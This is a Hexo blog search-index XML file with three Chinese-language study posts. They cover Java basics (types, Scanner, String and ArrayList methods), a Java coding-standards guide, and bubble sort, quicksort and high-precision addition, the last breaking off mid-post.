<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java入门基础</title>
    <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p> Java初学，包含使用IDEA创建文件，基本程序等等</p>
<span id="more"></span>

<h4 id="创建新的程序"><a href="#创建新的程序" class="headerlink" title="创建新的程序"></a>创建新的程序</h4><p><img src="https://i.niupic.com/images/2022/09/04/a51W.png"></p>
<p>如上图，创建一个JAVA程序的步骤依次向下创建，注意一个工程可以包含多个模块，一个模块可以包含多个包，一个包可以包含多个类。</p>
<h4 id="字面量-数据格式"><a href="#字面量-数据格式" class="headerlink" title="字面量(数据格式)"></a>字面量(数据格式)</h4><p>字符：用单引号括起来</p>
<p>字符串：用双引号括起来</p>
<p>空值：null</p>
<p>特殊字符：\n:换行符，\t:缩进符</p>
<p>默认整数是Int型，小数是double型，需要改变在数据后加上L/F。</p>
<h4 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXXXXX</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h4><p>数据范围小的变量可以直接赋值给数据范围大的变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span>a;</span><br><span class="line"><span class="type">double</span> c=b;</span><br><span class="line">System.out.println(b)</span><br></pre></td></tr></table></figure>

<p>另外注意在表达式中byte,short,char直接转化为Int型参与运算，因此byte+byte的结果类型必须定义为int。另外double&gt;float&gt;long&gt;int&gt;byte,short,char。一旦表达式有相应数据，则自动转化为大范围数据计算。</p>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><ul>
<li>逻辑与”&amp;”:有一个为false,结果是false。</li>
<li>短路与”&amp;”:一个是false，结果是false。<strong>前一个是false，后面的条件就不执行了</strong></li>
<li>逻辑或”|”和短路或”||” <strong>同上解释</strong></li>
<li>逻辑非”!”</li>
<li>逻辑异或”^”:相同时false，不同时true</li>
</ul>
<h4 id="键盘录入"><a href="#键盘录入" class="headerlink" title="键盘录入"></a>键盘录入</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner<span class="comment">//导包</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//建立对象 </span></span><br><span class="line">System.out.println(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line"><span class="type">int</span> age=sc.nextInt()</span><br><span class="line">System.out.println(<span class="string">&quot;你输入的密码是：&quot;</span>+age)</span><br></pre></td></tr></table></figure>

<h4 id="关于空格，空行的方法"><a href="#关于空格，空行的方法" class="headerlink" title="关于空格，空行的方法"></a>关于空格，空行的方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(i+<span class="string">&quot;\t&quot;</span>)<span class="comment">//数据之间的空格操作</span></span><br><span class="line">System.out.println()<span class="comment">//数据的空行操作</span></span><br></pre></td></tr></table></figure>

<h4 id="案例小练习：猜数字"><a href="#案例小练习：猜数字" class="headerlink" title="案例小练习：猜数字"></a>案例小练习：猜数字</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> guessnumber;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">func</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        Random r=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> num=r.nextInt(<span class="number">100</span>)+<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已随机生成1-100的数字\n&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你猜的数字\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> input=sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(input&gt;num) System.out.println(<span class="string">&quot;你猜的数字过大&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(input&lt;num) System.out.println(<span class="string">&quot;你猜的数字过小&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;正确！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] ages=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;<span class="comment">//静态初始化</span></span><br><span class="line"><span class="type">int</span>[]=&#123;input&#125;<span class="comment">//动态初始化</span></span><br><span class="line">System.out.println(ages.length)<span class="comment">//求数组长度</span></span><br></pre></td></tr></table></figure>

<h4 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h4><p>同一个类，出现多个方法名称相同，形参列表不同这些方法叫重载方法。</p>
<p>p.s. 返回值类型没关系</p>
<p>如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">()</span>&#123;</span><br><span class="line">	代码段<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">(String a)</span></span><br><span class="line">&#123;</span><br><span class="line">	代码段<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="return单独使用"><a href="#return单独使用" class="headerlink" title="return单独使用"></a>return单独使用</h4><p>单写一个return，</p>
<p>可以跳出并立即结束所在方法的执行</p>
<h4 id="生成随机字符"><a href="#生成随机字符" class="headerlink" title="生成随机字符"></a>生成随机字符</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch=(char) (ra.nextInt(26)+65);//生成随机大写字母</span><br><span class="line">char ch2=(char) (ra.nextInt(26)+97);//生成随机小写字母</span><br></pre></td></tr></table></figure>

<h4 id="String类常用api"><a href="#String类常用api" class="headerlink" title="String类常用api"></a>String类常用api</h4><p><strong>判断相等</strong>：在java中字符串内容比较不能使用”==”，因为java字符串表示的是地址。。</p>
<p>如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string name=<span class="string">&quot;zrm&quot;</span>;</span><br><span class="line">string password=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">string in_name,in_password;</span><br><span class="line">cin&gt;&gt;in_name&gt;&gt;in_password;</span><br><span class="line"><span class="keyword">if</span>(in_name==name&amp;&amp;in_password==password) cout&lt;&lt;<span class="string">&quot;正确&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;错误&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这一段C++代码是可以执行的，但是放在java中即使输入相同的名字密码都无法输出“正确”，因为定义的正确字符串存于常量区，而输入的字符串在堆内存中，两者的地址不一样，比较的结果是不相等。</p>
<p>因此需要用到一个判断内容相等的api：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">String password=<span class="string">&quot;123456&quot;</span>；</span><br><span class="line">Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in)</span><br><span class="line"><span class="comment">//定义接受输入内容的对象....</span></span><br><span class="line">name.equal(in_name)<span class="comment">//判断name字符串和in_name字符串内容是否相等，包括大小写检验</span></span><br><span class="line">password.equalIgnoreCase(in_password)<span class="comment">//判断前后是否相等，忽略大小写</span></span><br></pre></td></tr></table></figure>

<p><strong>对字符串的操作</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str=<span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">str.length();<span class="comment">//求字符串长度</span></span><br><span class="line">str.charAt(<span class="type">int</span> num);<span class="comment">//求字符串特定位置字符</span></span><br><span class="line">str.toCharArray();<span class="comment">//把字符串转成字符数组</span></span><br><span class="line">str.substring(<span class="type">int</span> first,<span class="type">int</span> last);<span class="comment">//截取，包前不包后</span></span><br><span class="line">str.substring(<span class="type">int</span> first);<span class="comment">//截取，从当前索引一直截取到末尾</span></span><br><span class="line">str.replace(String before,String <span class="keyword">new</span>);<span class="comment">//替换，把前一个内容全部替换成后一个内容</span></span><br><span class="line">str.contain(String s);<span class="comment">//判断是否包含，是返回true,否则返回false</span></span><br><span class="line">str.startsWith(String str);<span class="comment">//判断是否以此字符串开始</span></span><br><span class="line">String str2=<span class="string">&quot;aaa,bbb,ccc&quot;</span>;</span><br><span class="line">str.split(<span class="string">&quot;,&quot;</span>);<span class="comment">//按照&quot;,&quot;分开，返回字符串数组，需要有一个字符串数组对象接收返回值</span></span><br></pre></td></tr></table></figure>

<h4 id="生成验证码第二种表达方式"><a href="#生成验证码第二种表达方式" class="headerlink" title="生成验证码第二种表达方式"></a>生成验证码第二种表达方式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">special_number</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String str=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">        Random ra=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        String res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> num=ra.nextInt(str.length());</span><br><span class="line">            <span class="type">char</span> c=str.charAt(num);</span><br><span class="line">            res+=c;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ArrayList类"><a href="#ArrayList类" class="headerlink" title="ArrayList类"></a>ArrayList类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();<span class="comment">//尖括号内约束数据类型</span></span><br><span class="line">list.add();<span class="comment">//直接添加</span></span><br><span class="line">list.add(<span class="type">int</span> index,type data);<span class="comment">//在指定位置插入元素</span></span><br><span class="line">list.get(<span class="type">int</span> index);<span class="comment">//获得指定位置元素</span></span><br><span class="line">list.size();<span class="comment">//获得元素个数</span></span><br><span class="line">list.remove(<span class="type">int</span> index);<span class="comment">//删除索引位置元素，返回被删除的元素值</span></span><br><span class="line">list.remove(Object o);<span class="comment">//删除容器内元素的值，如有多个相同值则删除第一个</span></span><br><span class="line">list.set(<span class="type">int</span> index,E element);<span class="comment">//修改索引位置的元素为后面的元素</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>“代码规范”</title>
    <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<p> 软件开发代码规范:</p>
<span id="more"></span>

<h1 id="JAVA代码规范"><a href="#JAVA代码规范" class="headerlink" title="JAVA代码规范"></a>JAVA代码规范</h1><h2 id="普通规范"><a href="#普通规范" class="headerlink" title="普通规范"></a>普通规范</h2><h4 id="包的命名方式：公司域名倒置-子公司-产品名称-功能名称"><a href="#包的命名方式：公司域名倒置-子公司-产品名称-功能名称" class="headerlink" title="包的命名方式：公司域名倒置+子公司/产品名称+功能名称"></a>包的命名方式：公司域名倒置+子公司/产品名称+功能名称</h4><p>如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">net.hedao.music</span><br><span class="line">net.hedao.uem.internal</span><br><span class="line">net.hedao.uem.http</span><br></pre></td></tr></table></figure>



<h4 id="utils和tools命名规范"><a href="#utils和tools命名规范" class="headerlink" title="utils和tools命名规范"></a>utils和tools命名规范</h4><p>utils:</p>
<ul>
<li>定义：通用的，与业务无关，可供其他项目使用</li>
<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
<li>例子：字符串类，文件工具类</li>
</ul>
<p>tools:</p>
<ul>
<li>定义：在当前项目通用；仅能在当前项目使用</li>
<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
<li>用户校验类，支付工具类</li>
</ul>
<h4 id="类名规范"><a href="#类名规范" class="headerlink" title="类名规范"></a>类名规范</h4><p>类名首字母大写，若多个单词拼合则采取驼峰式命名</p>
<p>如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestDemo</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h4><p>成员属性，变量名使用有含义的单词或词组构成；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">long</span> abc=<span class="number">0</span>;<span class="comment">//禁止</span></span><br></pre></td></tr></table></figure>

<p>常量必须由大写字母和下划线分割单词的方式组成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_NUMBER</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br></pre></td></tr></table></figure>

<p>静态变量:采用小写s开头，代表static，s后首字母大写，遵循驼峰原则</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> sCurrentTime;</span><br></pre></td></tr></table></figure>

<p>实体类，java bean类中普通成员变量采用小写字母开头，单词之间采用驼峰式命名规范。</p>
<p>注：此类用于存储数据，只有setter,getter方法，不作其他业务处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">			<span class="keyword">private</span> String userName;</span><br><span class="line">			<span class="keyword">private</span> String userAccount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法的命名规范"><a href="#方法的命名规范" class="headerlink" title="方法的命名规范"></a>方法的命名规范</h4><p>方法命名采用小写字母开头，字母之间采用驼峰式命名规范，一般不超过20个字符，长度很长时可以使用简写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">calculateScreenSize</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUInfo</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">size</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUserInfomation</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="注释规范"><a href="#注释规范" class="headerlink" title="注释规范"></a>注释规范</h2><p>注释：</p>
<ul>
<li>屏蔽不需要执行的代码</li>
<li>对代码进行解释说明</li>
</ul>
<h4 id="类的注释"><a href="#类的注释" class="headerlink" title="类的注释"></a>类的注释</h4><p>类的注释采用多行注释方式，在包名和类定义中间，通常记录作者信息，版本号，类的功能描述信息等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* 文件工具类</span></span><br><span class="line"><span class="comment">* 项目名称:JAVA编码规范测试用例</span></span><br><span class="line"><span class="comment">* 包:net.herdao.common.utils   </span></span><br><span class="line"><span class="comment">* 类名称:FileUtils.java</span></span><br><span class="line"><span class="comment">* 类描述:本类是一个文件操作工具类，包括了文件的几个基本操作方法，创建文件、删除文件、文件重命名</span></span><br><span class="line"><span class="comment">* 创建人:林鸿亮</span></span><br><span class="line"><span class="comment">* 创建时间:2021/10/21 11:46</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUtils</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法的注释"><a href="#方法的注释" class="headerlink" title="方法的注释"></a>方法的注释</h4><p>多行注释，主要内容记录该方法的<strong>作用</strong>，<strong>参数及参数说明</strong>，<strong>返回值</strong>、<strong>返回类容</strong>和<strong>异常信息说明</strong>，<strong>修改记录</strong>，<strong>是否过期</strong>，及<strong>修改日期</strong>等等。</p>
<p>我们规定所有public类型的方法必须加上注释<strong>对方法和参数</strong>加以说明，private方法中如果处理逻辑相对较多，相对复杂的也应加上注释。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 在指定目录创建一个新文件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> dirPath  文件目录路径</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> fileName 文件名称</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span>  返回创建的新文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">createeNewFile</span><span class="params">(String dirPath, String fileName)</span> </span><br><span class="line">&#123;<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dirPath,fileName);</span><br><span class="line"> <span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="成员属性的注释"><a href="#成员属性的注释" class="headerlink" title="成员属性的注释"></a>成员属性的注释</h4><p>可以使用单行注释也可以使用多行注释</p>
<p>代码块和单行代码通常采用单行注释</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123; <span class="comment">//判断文件是否存在</span></span><br><span class="line">file.delete(); <span class="comment">//删除文件</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码格式规范"><a href="#代码格式规范" class="headerlink" title="代码格式规范"></a>代码格式规范</h3><h4 id="统一编码格式"><a href="#统一编码格式" class="headerlink" title="统一编码格式"></a>统一编码格式</h4><p>统一采用UTF-8的格式</p>
<h4 id="编码的缩进"><a href="#编码的缩进" class="headerlink" title="编码的缩进"></a>编码的缩进</h4><p>缩进空格数为4，同一业务级代码块保持左对齐，不能全在同一垂直线上</p>
<h4 id="代码行宽度"><a href="#代码行宽度" class="headerlink" title="代码行宽度"></a>代码行宽度</h4><p>单行代码最长不得超过120列</p>
<h4 id="代码行长度"><a href="#代码行长度" class="headerlink" title="代码行长度"></a>代码行长度</h4><p>方法长度限制在100行内，若有超过可能按照<strong>业务逻辑</strong>拆分成多个方法</p>
<h4 id="属性及方法的范围确定"><a href="#属性及方法的范围确定" class="headerlink" title="属性及方法的范围确定"></a>属性及方法的范围确定</h4><ul>
<li><p>public : 当某个方法或属性需要<strong>被外部非子类和非同包内中的对象直接调用</strong>的时候采用public属性。</p>
</li>
<li><p>protected : 当某个方法或属性<strong>只会被其子类调用</strong>或者<strong>只会同一包下的其他对象调用</strong>时，使用protected限制。</p>
</li>
<li><p>private: 当某个方法或属性<strong>只会被本类中的其他方法调用</strong>的时候，使用private限制。</p>
</li>
</ul>
<h4 id="硬编码的后遗症"><a href="#硬编码的后遗症" class="headerlink" title="硬编码的后遗症"></a>硬编码的后遗症</h4><p>常量字符串或数值必须<strong>在类中定义常量值</strong>，通过<strong>常量值引用</strong>来使用固定数值和固定字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">public static final int MIN_DATA = 1;</span><br><span class="line">public static final int MAX_DATA = 99;</span><br><span class="line">public static final String STR_SUM = &quot;岗位评分结果为=&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void printSum() &#123;</span><br><span class="line">System.out.println(STR_SUM+(MIN_DATA+MAX_DATA));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="TODO规范"><a href="#TODO规范" class="headerlink" title="TODO规范"></a>TODO规范</h4><p>用来描述已知待改进，待补充的修改点，加上作者名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// TODO &lt;“作者名称”&gt;: 补充XX处理</span><br></pre></td></tr></table></figure>

<h4 id="方法参数规范"><a href="#方法参数规范" class="headerlink" title="方法参数规范"></a>方法参数规范</h4><p>每个方法最多三个参数，超出三个要封装成javabean对象</p>
<h4 id="SysLog日志注解使用"><a href="#SysLog日志注解使用" class="headerlink" title="@SysLog日志注解使用"></a>@SysLog日志注解使用</h4><p>接口涉及增删改数据时必须使用@SysLog注解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;权限配置-修改用户角色&quot;,notes = &quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@SysLog(&quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/editUserRole&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Boolean&gt; <span class="title function_">saveUserRole</span><span class="params">(<span class="meta">@RequestBody</span> UserDTO userDTO)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(userDTO.getUserId() == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> R.failed(Boolean.FALSE).setMsg(<span class="string">&quot;用户id不能为空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> R.ok(userService.saveUserRole(userDTO));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="工程框架规范"><a href="#工程框架规范" class="headerlink" title="工程框架规范"></a>工程框架规范</h3><h4 id="应用分层"><a href="#应用分层" class="headerlink" title="应用分层"></a>应用分层</h4><p>代码分层为MVC方式，<strong>不能</strong>用DDD方式修改代码目录结构</p>
<h4 id="依赖包管理版本规范"><a href="#依赖包管理版本规范" class="headerlink" title="依赖包管理版本规范"></a>依赖包管理版本规范</h4><p>基础平台父工程hdp已经引入绝大部分开发所需maven 依赖包，如果需要增加依赖包必须先征得架构师同意。业务项目<strong>不得重复添加已有依赖包</strong>，所添加依赖包版本必须<strong>与基础平台依赖包版本一致</strong>，引入后必须<strong>处理依赖冲突</strong>。</p>
]]></content>
  </entry>
  <entry>
    <title>基础算法01</title>
    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
    <content><![CDATA[<p> 这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
<p>主要是：排序总结，高精度总结。</p>
<span id="more"></span>

<h3 id="排序模板"><a href="#排序模板" class="headerlink" title="排序模板"></a>排序模板</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，……的排序，至此排序完成。</p>
<p>核心代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//外层循环记录要大排序次数，是数组元素数量-1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++)<span class="comment">//内层循环记录在一次排序下两两比较的次数，是大排序总次数减去当前排序的次数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现较为简单，因为有两层循环的缘故，时间可能较慢，另外需要注意两次循环的边界条件</p>
<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
<p>原理也比较好理解:先把整个数列分成两部分，把两边的数据和中间值比较，比中间值小的放左边，反之放右边，依次操作完毕后这个中间值就是已排序状态，然后分别用同样的方法操作左右两段数据，可以看出这是根据递归定义的排序方法，在递归最底层达到条件：找不到中间值时，整段数据已经排序完毕。这里解释的不是特别全面，有一些情况可以根据代码举个例子理解。</p>
<p>核心代码大同小异，这里我就摆一种：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quicksort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span><span class="comment">//l,r表示数组的左右两端</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> mid=arr[(l+r)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i=l,j=r;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[i]&lt;mid) i++;</span><br><span class="line">		<span class="keyword">while</span>(arr[j]&gt;mid) j--;</span><br><span class="line">		<span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">swap</span>(arr[i],arr[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;j) <span class="built_in">quicksort</span>(l,j);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;i) <span class="built_in">quicksort</span>(i,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>排序就先摆两个吧，有空了再贴(画饼</p>
<h3 id="高精度计算"><a href="#高精度计算" class="headerlink" title="高精度计算"></a>高精度计算</h3><h4 id="a-b高精度"><a href="#a-b高精度" class="headerlink" title="a+b高精度"></a>a+b高精度</h4><p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
<p>高精度一个很基础的想法就是数无法使用，那就使用数组，基本思路是使用字符串型读入数据，再转入数组之中进行操作。下一步可以理解为模拟竖式加法的做法，依次从个位开始对两个数字进行相加，大于10则保留个位并将十位上进一，依次操作到最后一位，并将结果数组倒序输出即可。</p>
<p><strong>实现代码：</strong></p>
<p>读入数组部分：</p>
